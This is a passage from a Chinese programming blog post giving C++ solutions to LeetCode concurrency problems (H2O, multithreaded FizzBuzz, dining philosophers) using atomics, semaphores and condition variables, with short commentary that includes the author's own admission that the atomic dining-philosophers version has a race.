class="line">&#125;;</span><br></pre></td></tr></table></figure><p>很简洁，但比信号量慢点。</p><h3 id="semaphore-3"><a href="#semaphore-3" class="headerlink" title="semaphore"></a>semaphore</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">H2O</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">sem_t</span> H_done,O_done;</span><br><span class="line">    <span class="type">int</span> H_cnt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">H2O</span>() &#123;</span><br><span class="line">        <span class="built_in">sem_init</span>(&amp;H_done,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">sem_init</span>(&amp;O_done,<span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">hydrogen</span><span class="params">(function&lt;<span class="type">void</span>()&gt; releaseHydrogen)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sem_wait</span>(&amp;O_done);</span><br><span class="line">        <span class="built_in">releaseHydrogen</span>();</span><br><span class="line">        H_cnt++;</span><br><span class="line">        <span class="keyword">if</span>(H_cnt == <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">sem_post</span>(&amp;H_done);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">oxygen</span><span class="params">(function&lt;<span class="type">void</span>()&gt; releaseOxygen)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sem_wait</span>(&amp;H_done);</span><br><span class="line">        <span class="built_in">releaseOxygen</span>();</span><br><span class="line">        H_cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">sem_post</span>(&amp;O_done);</span><br><span class="line">        <span class="built_in">sem_post</span>(&amp;O_done);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>比1114更复杂，需要变量记录当前已释放的H原子个数，达到2个才能放O原子。</p><h3 id="condition-variable-3"><a href="#condition-variable-3" class="headerlink" title="condition variable"></a>condition variable</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">H2O</span> &#123;</span><br><span class="line">    mutex mtx;</span><br><span class="line">    condition_variable cv;</span><br><span class="line">    <span class="type">int</span> H_cnt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">H2O</span>() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">hydrogen</span><span class="params">(function&lt;<span class="type">void</span>()&gt; releaseHydrogen)</span> </span>&#123;</span><br><span class="line">        unique_lock&lt;mutex&gt;<span class="built_in">locker</span>(mtx);</span><br><span class="line">        cv.<span class="built_in">wait</span>(locker, [<span class="keyword">this</span>] &#123;<span class="keyword">return</span> H_cnt &lt; <span class="number">2</span>;&#125;);</span><br><span class="line">        <span class="comment">// releaseHydrogen() outputs &quot;H&quot;. Do not change or remove this line.</span></span><br><span class="line">        <span class="built_in">releaseHydrogen</span>();</span><br><span class="line">        H_cnt++;</span><br><span class="line">        cv.<span class="built_in">notify_all</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">oxygen</span><span class="params">(function&lt;<span class="type">void</span>()&gt; releaseOxygen)</span> </span>&#123;</span><br><span class="line">        unique_lock&lt;mutex&gt;<span class="built_in">locker</span>(mtx);</span><br><span class="line">        cv.<span class="built_in">wait</span>(locker, [<span class="keyword">this</span>] &#123;<span class="keyword">return</span> H_cnt == <span class="number">2</span>;&#125;);</span><br><span class="line">        <span class="comment">// releaseOxygen() outputs &quot;O&quot;. Do not change or remove this line.</span></span><br><span class="line">        <span class="built_in">releaseOxygen</span>();</span><br><span class="line">        H_cnt = <span class="number">0</span>;</span><br><span class="line">        cv.<span class="built_in">notify_all</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="1195-交替打印字符串"><a href="#1195-交替打印字符串" class="headerlink" title="1195. 交替打印字符串"></a><a href="https://leetcode-cn.com/problems/fizz-buzz-multithreaded">1195. 交替打印字符串</a></h2><h3 id="atomic-operation-4"><a href="#atomic-operation-4" class="headerlink" title="atomic operation"></a>atomic operation</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;atomic&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FizzBuzz</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    atomic_int flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">FizzBuzz</span>(<span class="type">int</span> n) &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;n = n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printFizz() outputs &quot;fizz&quot;.</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">fizz</span><span class="params">(function&lt;<span class="type">void</span>()&gt; printFizz)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>; i &lt;= n; i += <span class="number">3</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i % <span class="number">5</span> != <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">while</span>(flag != <span class="number">1</span>) this_thread::<span class="built_in">yield</span>();</span><br><span class="line">                <span class="built_in">printFizz</span>();</span><br><span class="line">                flag = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printBuzz() outputs &quot;buzz&quot;.</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">buzz</span><span class="params">(function&lt;<span class="type">void</span>()&gt; printBuzz)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">5</span>; i &lt;= n; i += <span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i % <span class="number">3</span> != <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">while</span>(flag != <span class="number">2</span>) this_thread::<span class="built_in">yield</span>();</span><br><span class="line">                <span class="built_in">printBuzz</span>();</span><br><span class="line">                flag = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printFizzBuzz() outputs &quot;fizzbuzz&quot;.</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fizzbuzz</span><span class="params">(function&lt;<span class="type">void</span>()&gt; printFizzBuzz)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i % <span class="number">5</span> == <span class="number">0</span> &amp;&amp; i % <span class="number">3</span> == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">while</span>(flag != <span class="number">3</span>) this_thread::<span class="built_in">yield</span>();</span><br><span class="line">                <span class="built_in">printFizzBuzz</span>();</span><br><span class="line">                flag = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printNumber(x) outputs &quot;x&quot;, where x is an integer.</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">number</span><span class="params">(function&lt;<span class="type">void</span>(<span class="type">int</span>)&gt; printNumber)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">            <span class="keyword">while</span>(flag) this_thread::<span class="built_in">yield</span>();</span><br><span class="line">            <span class="keyword">if</span>(i % <span class="number">5</span> != <span class="number">0</span> &amp;&amp; i % <span class="number">3</span> != <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printNumber</span>(i);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(i % <span class="number">5</span> != <span class="number">0</span> &amp;&amp; i % <span class="number">3</span> == <span class="number">0</span>)&#123;</span><br><span class="line">                flag = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(i % <span class="number">5</span> == <span class="number">0</span> &amp;&amp; i % <span class="number">3</span> != <span class="number">0</span>)&#123;</span><br><span class="line">                flag = <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                flag = <span class="number">3</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="semaphore-4"><a href="#semaphore-4" class="headerlink" title="semaphore"></a>semaphore</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FizzBuzz</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="type">sem_t</span> numPrint, fizzPrint, buzzPrint, fzbzPrint;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">FizzBuzz</span>(<span class="type">int</span> n) &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;n = n;</span><br><span class="line">        <span class="built_in">sem_init</span>(&amp;numPrint, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">sem_init</span>(&amp;fizzPrint, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">sem_init</span>(&amp;buzzPrint, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">sem_init</span>(&amp;fzbzPrint, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printFizz() outputs &quot;fizz&quot;.</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">fizz</span><span class="params">(function&lt;<span class="type">void</span>()&gt; printFizz)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i % <span class="number">3</span> == <span class="number">0</span> &amp;&amp; i % <span class="number">5</span> != <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">sem_wait</span>(&amp;fizzPrint);</span><br><span class="line">                <span class="built_in">printFizz</span>();</span><br><span class="line">                <span class="built_in">sem_post</span>(&amp;numPrint);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printBuzz() outputs &quot;buzz&quot;.</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">buzz</span><span class="params">(function&lt;<span class="type">void</span>()&gt; printBuzz)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i % <span class="number">3</span> != <span class="number">0</span> &amp;&amp; i % <span class="number">5</span> == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">sem_wait</span>(&amp;buzzPrint);</span><br><span class="line">                <span class="built_in">printBuzz</span>();</span><br><span class="line">                <span class="built_in">sem_post</span>(&amp;numPrint);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printFizzBuzz() outputs &quot;fizzbuzz&quot;.</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fizzbuzz</span><span class="params">(function&lt;<span class="type">void</span>()&gt; printFizzBuzz)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i % <span class="number">3</span> == <span class="number">0</span> &amp;&amp; i % <span class="number">5</span> == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">sem_wait</span>(&amp;fzbzPrint);</span><br><span class="line">                <span class="built_in">printFizzBuzz</span>();</span><br><span class="line">                <span class="built_in">sem_post</span>(&amp;numPrint);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printNumber(x) outputs &quot;x&quot;, where x is an integer.</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">number</span><span class="params">(function&lt;<span class="type">void</span>(<span class="type">int</span>)&gt; printNumber)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">            <span class="built_in">sem_wait</span>(&amp;numPrint);</span><br><span class="line">            <span class="keyword">if</span>(i % <span class="number">3</span> != <span class="number">0</span> &amp;&amp; i % <span class="number">5</span> != <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printNumber</span>(i);</span><br><span class="line">                <span class="built_in">sem_post</span>(&amp;numPrint);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(i % <span class="number">3</span> == <span class="number">0</span> &amp;&amp; i % <span class="number">5</span> != <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">sem_post</span>(&amp;fizzPrint);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(i % <span class="number">3</span> != <span class="number">0</span> &amp;&amp; i % <span class="number">5</span> == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">sem_post</span>(&amp;buzzPrint);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">sem_post</span>(&amp;fzbzPrint);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>依然是基础的变式。</p><h3 id="condition-variable-4"><a href="#condition-variable-4" class="headerlink" title="condition variable"></a>condition variable</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">FizzBuzz</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> n, flag = <span class="number">0</span>;</span><br><span class="line">    mutex mtx;</span><br><span class="line">    condition_variable cv;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">FizzBuzz</span>(<span class="type">int</span> n) &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;n = n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printFizz() outputs &quot;fizz&quot;.</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">fizz</span><span class="params">(function&lt;<span class="type">void</span>()&gt; printFizz)</span> </span>&#123;</span><br><span class="line">        unique_lock&lt;mutex&gt;<span class="built_in">locker</span>(mtx);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>; i &lt;= n; i += <span class="number">3</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i % <span class="number">5</span> != <span class="number">0</span>)&#123;</span><br><span class="line">                cv.<span class="built_in">wait</span>(locker, [<span class="keyword">this</span>] &#123;<span class="keyword">return</span> flag == <span class="number">1</span>;&#125;);</span><br><span class="line">                <span class="built_in">printFizz</span>();</span><br><span class="line">                flag = <span class="number">0</span>;</span><br><span class="line">                cv.<span class="built_in">notify_all</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printBuzz() outputs &quot;buzz&quot;.</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">buzz</span><span class="params">(function&lt;<span class="type">void</span>()&gt; printBuzz)</span> </span>&#123;</span><br><span class="line">        unique_lock&lt;mutex&gt;<span class="built_in">locker</span>(mtx);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">5</span>; i &lt;= n; i += <span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i % <span class="number">3</span> != <span class="number">0</span>)&#123;</span><br><span class="line">                cv.<span class="built_in">wait</span>(locker, [<span class="keyword">this</span>] &#123;<span class="keyword">return</span> flag == <span class="number">2</span>;&#125;);</span><br><span class="line">                <span class="built_in">printBuzz</span>();</span><br><span class="line">                flag = <span class="number">0</span>;</span><br><span class="line">                cv.<span class="built_in">notify_all</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printFizzBuzz() outputs &quot;fizzbuzz&quot;.</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fizzbuzz</span><span class="params">(function&lt;<span class="type">void</span>()&gt; printFizzBuzz)</span> </span>&#123;</span><br><span class="line">        unique_lock&lt;mutex&gt;<span class="built_in">locker</span>(mtx);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i % <span class="number">5</span> == <span class="number">0</span> &amp;&amp; i % <span class="number">3</span> == <span class="number">0</span>)&#123;</span><br><span class="line">                cv.<span class="built_in">wait</span>(locker, [<span class="keyword">this</span>] &#123;<span class="keyword">return</span> flag == <span class="number">3</span>;&#125;);</span><br><span class="line">                <span class="built_in">printFizzBuzz</span>();</span><br><span class="line">                flag = <span class="number">0</span>;</span><br><span class="line">                cv.<span class="built_in">notify_all</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printNumber(x) outputs &quot;x&quot;, where x is an integer.</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">number</span><span class="params">(function&lt;<span class="type">void</span>(<span class="type">int</span>)&gt; printNumber)</span> </span>&#123;</span><br><span class="line">        unique_lock&lt;mutex&gt;<span class="built_in">locker</span>(mtx);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">            cv.<span class="built_in">wait</span>(locker, [<span class="keyword">this</span>] &#123;<span class="keyword">return</span> flag == <span class="number">0</span>;&#125;);</span><br><span class="line">            <span class="keyword">if</span>(i % <span class="number">5</span> != <span class="number">0</span> &amp;&amp; i % <span class="number">3</span> != <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printNumber</span>(i);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(i % <span class="number">5</span> != <span class="number">0</span> &amp;&amp; i % <span class="number">3</span> == <span class="number">0</span>)&#123;</span><br><span class="line">                flag = <span class="number">1</span>;</span><br><span class="line">                cv.<span class="built_in">notify_all</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(i % <span class="number">5</span> == <span class="number">0</span> &amp;&amp; i % <span class="number">3</span> != <span class="number">0</span>)&#123;</span><br><span class="line">                flag = <span class="number">2</span>;</span><br><span class="line">                cv.<span class="built_in">notify_all</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                flag = <span class="number">3</span>;</span><br><span class="line">                cv.<span class="built_in">notify_all</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="1226-哲学家进餐"><a href="#1226-哲学家进餐" class="headerlink" title="1226. 哲学家进餐"></a><a href="https://leetcode-cn.com/problems/the-dining-philosophers">1226. 哲学家进餐</a></h2><h3 id="atomic-operation-5"><a href="#atomic-operation-5" class="headerlink" title="atomic operation"></a>atomic operation</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;atomic&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DiningPhilosophers</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    atomic_bool forks[<span class="number">5</span>];</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">DiningPhilosophers</span>() &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line">            forks[i] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">wantsToEat</span><span class="params">(<span class="type">int</span> philosopher,</span></span></span><br><span class="line"><span class="params"><span class="function">                    function&lt;<span class="type">void</span>()&gt; pickLeftFork,</span></span></span><br><span class="line"><span class="params"><span class="function">                    function&lt;<span class="type">void</span>()&gt; pickRightFork,</span></span></span><br><span class="line"><span class="params"><span class="function">                    function&lt;<span class="type">void</span>()&gt; eat,</span></span></span><br><span class="line"><span class="params"><span class="function">                    function&lt;<span class="type">void</span>()&gt; putLeftFork,</span></span></span><br><span class="line"><span class="params"><span class="function">                    function&lt;<span class="type">void</span>()&gt; putRightFork)</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> L = philosopher, R = (philosopher + <span class="number">1</span>) % <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">if</span>(philosopher % <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">while</span>(!forks[L]) this_thread::<span class="built_in">yield</span>();</span><br><span class="line">            forks[L] = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">while</span>(!forks[R]) this_thread::<span class="built_in">yield</span>();</span><br><span class="line">            forks[R] = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">while</span>(!forks[R]) this_thread::<span class="built_in">yield</span>();</span><br><span class="line">            forks[R] = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">while</span>(!forks[L]) this_thread::<span class="built_in">yield</span>();</span><br><span class="line">            forks[L] = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">pickLeftFork</span>();</span><br><span class="line">        <span class="built_in">pickRightFork</span>();</span><br><span class="line">        <span class="built_in">eat</span>();</span><br><span class="line">        <span class="built_in">putLeftFork</span>();</span><br><span class="line">        <span class="built_in">putRightFork</span>();</span><br><span class="line">        forks[L] = <span class="literal">true</span>;</span><br><span class="line">        forks[R] = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>思路和<code>semaphore</code>相同。但是对原子操作的使用不太熟练，尝试在声明<code>forks[]</code>时就初始化，出错了，遂改为在<code>constructor</code>中初始化。另一方面，上述代码能通过测试，但似乎并不是原子操作。如下图，经测试，在<code>while()</code>阻塞之后设置延时，就出现了bug。暂未实现真正的原子操作。</p><p><img src="https://img.lfalive.top/LeetCode-Concurrency/notAtomic.png"></p><h3 id="semaphore-5"><a href="#semaphore-5" class="headerlink" title="semaphore"></a>semaphore</h3><p>奇数的哲学家先拿左边叉子，偶数的先拿右边叉子，不会出现循环等待。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DiningPhilosophers</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">sem_t</span> forks[<span class="number">5</span>];</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">DiningPhilosophers</span>() &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line">            <span class="built_in">sem_init</span>(&amp;forks[i], <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">wantsToEat</span><span class="params">(<span class="type">int</span> philosopher,</span></span></span><br><span class="line"><span class="params"><span class="function">                    function&lt;<span class="type">void</span>()&gt; pickLeftFork,</span></span></span><br><span class="line"><span class="params"><span class="function">                    function&lt;<span class="type">void</span>()&gt; pickRightFork,</span></span></span><br><span class="line"><span class="params"><span class="function">                    function&lt;<span class="type">void</span>()&gt; eat,</span></span></span><br><span class="line"><span class="params"><span class="function">                    function&lt;<span class="type">void</span>()&gt; putLeftFork,</span></span></span><br><span class="line"><span class="params"><span class="function">                    function&lt;<span class="type">void</span>()&gt; putRightFork)</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> L = philosopher, R = (philosopher + <span class="number">1</span>) % <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">if</span>(philosopher % <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">sem_wait</span>(&amp;forks[L]);</span><br><span class="line">            <span class="built_in">sem_wait</span>(&amp;forks[R]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">sem_wait</span>(&amp;forks[R]);</span><br><span class="line">            <span class="built_in">sem_wait</span>(&amp;forks[L]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">pickLeftFork</span>();</span><br><span class="line">        <span class="built_in">pickRightFork</span>();</span><br><span class="line">        <span class="built_in">eat</span>();</span><br><span class="line">        <span class="built_in">putLeftFork</span>();</span><br><span class="line">        <span class="built_in">putRightFork</span>();</span><br><span class="line">        <span class="built_in">sem_post</span>(&amp;forks[L]);</span><br><span class="line">        <span class="built_in">sem_post</span>(&amp;forks[R]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="condition-variable-5"><a href="#condition-variable-5" class="headerlink" title="condition variable"></a>condition variable</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">DiningPhilosophers</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    mutex mtx;</span><br><span class="line">    condition_variable cv;</span><br><span class="line">    <span class="type">bool</span> forks[<span class="number">5</span>];</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">DiningPhilosophers</span>() &#123; </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line">            forks[i] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">wantsToEat</span><span class="params">(<span class="type">int</span> philosopher,</span></span></span><br><span class="line"><span class="params"><span class="function">                    function&lt;<span class="type">void</span>()&gt; pickLeftFork,</span></span></span><br><span class="line"><span class="params"><span class="function">                    function&lt;<span class="type">void</span>()&gt; pickRightFork,</span></span></span><br><span class="line"><span class="params"><span class="function">                    function&lt;<span class="type">void</span>()&gt; eat,</span></span></span><br><span class="line"><span class="params"><span class="function">                    function&lt;<span class="type">void</span>()&gt; putLeftFork,</span></span></span><br><span class="line"><span class="params"><span class="function">                    function&lt;<span class="type">void</span>()&gt; putRightFork)</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> L = philosopher, R = (philosopher + <span class="number">1</span>) % <span class="number">5</span>;</span><br><span class="line">        <span class="function">unique_lock&lt;mutex&gt; <span class="title">locker</span><span class="params">(mtx)</span></span>;</span><br><span class="line">        cv.<span class="built_in">wait</span>(locker, [<span class="keyword">this</span>, L, R] &#123;<span class="keyword">return</span> forks[L] &amp;&amp; forks[R];&#125;);</span><br><span class="line">        forks[L] = <span class="literal">false</span>;</span><br><span class="line">        forks[R] = <span class="literal">false</span>;</span><br><span class="line">        locker.<span class="built_in">unlock</span>();</span><br><span class="line">        <span class="built_in">pickLeftFork</span>();</span><br><span class="line">        <span class="built_in">pickRightFork</span>();</span><br><span class="line">        <span class="built_in">eat</span>();</span><br><span class="line">        <span class="built_in">putLeftFork</span>();</span><br><span class="line">        <span class="built_in">putRightFork</span>();</span><br><span class="line">        locker.<span class="built_in">lock</span>();</span><br><span class="line">        forks[L] = <span class="literal">true</span>;</span><br><span class="line">        forks[R] = <span class="literal">true</span>;</span><br><span class="line">        locker.<span class="built_in">unlock</span>();</span><br><span class="line">        cv.<span class="built_in">notify_all</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>要么同时拿两个餐具，要么都不拿。和原子操作不同的是，在发现左右叉子都可用后，马上加锁了，不会有其他哲学家发现叉子可用。</p>]]></content>
      
      
      <categories>
          
          <category> concurrency </category>
          
      </categories>
      
      
        <tags>
            
            <tag> concurrency </tag>
